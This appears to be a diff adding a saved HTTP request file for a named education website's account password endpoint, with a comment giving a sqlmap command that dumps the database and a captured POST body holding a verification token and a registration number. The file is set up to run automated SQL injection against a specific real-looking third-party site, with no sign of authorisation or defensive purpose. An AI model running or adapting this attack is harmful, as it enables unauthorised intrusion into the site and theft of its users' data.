@@ -1,0 +1,3 @@
+http://online.udvash-unmesh.com:80/Account/Password (POST)  # .\sqlmap.py -r .\postReqs\udvashlogin --dump --threads=10
+
+__RequestVerificationToken=5Gn6QCAK-aFUfkaG3OJgQhL_vw5JIdEX_J74Etvdg4PMyAj8GafTN7JlE-R1yYI23S2unDR4-v72C6cisi67ZqaN1Dr_Mh5GpXTRgVX7pTw1&returnUrl=&RegistrationNumber=1964406666
